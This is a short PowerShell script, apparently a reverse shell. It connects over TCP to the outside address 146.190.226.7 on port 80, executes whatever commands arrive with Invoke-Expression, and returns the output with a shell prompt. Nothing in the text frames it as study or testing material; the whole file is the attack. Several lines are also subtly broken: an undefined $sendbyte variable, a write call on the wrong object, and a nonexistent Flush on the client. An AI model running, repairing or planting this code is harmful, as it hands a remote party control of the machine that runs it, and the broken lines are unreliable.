﻿$client = New-Object System.Net.Sockets.TCPCLIENT("146.190.226.7", 80);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte.Write($sendbyte, 0, $sendbyte.Length);
$stream.Flush();
}
$client.Flush();